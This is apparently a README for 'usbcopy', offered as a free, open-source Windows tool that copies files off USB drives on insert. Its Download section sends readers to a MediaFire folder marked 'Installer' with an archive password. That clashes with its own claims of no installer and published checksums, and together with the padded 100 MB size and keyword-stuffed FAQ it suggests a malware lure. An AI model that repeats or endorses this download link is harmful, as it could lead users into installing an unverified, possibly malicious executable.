# usbcopy

💾 Free, open-source auto USB copy tool for Windows — grab photos and docs from any stick the moment it plugs in. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Listens for volumes** — any USB stick or card reader triggers the job automatically on insert
- ✅ **Rule-based filtering** — copy only chosen extensions or only files newer than a date
- ✅ **Incremental by default** — already-copied files are skipped, so reinserting a card costs seconds
- ✅ **Destination templates** — organize into date and device folders with token patterns
- ✅ **Dry-run preview** — see exactly what would copy before enabling auto-import
- ✅ **Tray notifications and log** — a toast confirms each import with file counts and total size
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why usbcopy

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **usbcopy** | USB Flash Copy | Fab's AutoBackup | AutoPlay |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid | Built-in |
| Open source | **Yes** | No | No | No |
| Extension rules and dry-run | **Yes** | Partial | Yes | No |
| Incremental skip logic | **Yes** | Yes | Yes | No |
| Destination templates | **Yes** | Partial | Yes | No |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | With OS |

## FAQ

**how to automatically copy files from a USB drive when it is plugged in?**

AutoPlay only opens folders, and manual copying forgets footage for weeks until the card is reformatted. usbcopy watches for volumes, applies your extension and date rules, and imports incrementally into templated folders with a dry-run to prove the logic first. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark rules panel (#121418, cyan #22D3EE): watch toggle on, extension chips JPG RAW MP4, destination template field with date tokens, dry-run button.
2. Dry-run report: 342 files would copy totaling 8.2 GB, skip list of 118 already present, enable auto-import button after review.
3. Tray activity: toast preview Cards imported 342 files, log table with volume labels and durations, retention note about originals untouched.

## Download

| Source | Link |
|---|---|
| 💾 **Installer usbcopy** | [Installer usbcopy](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).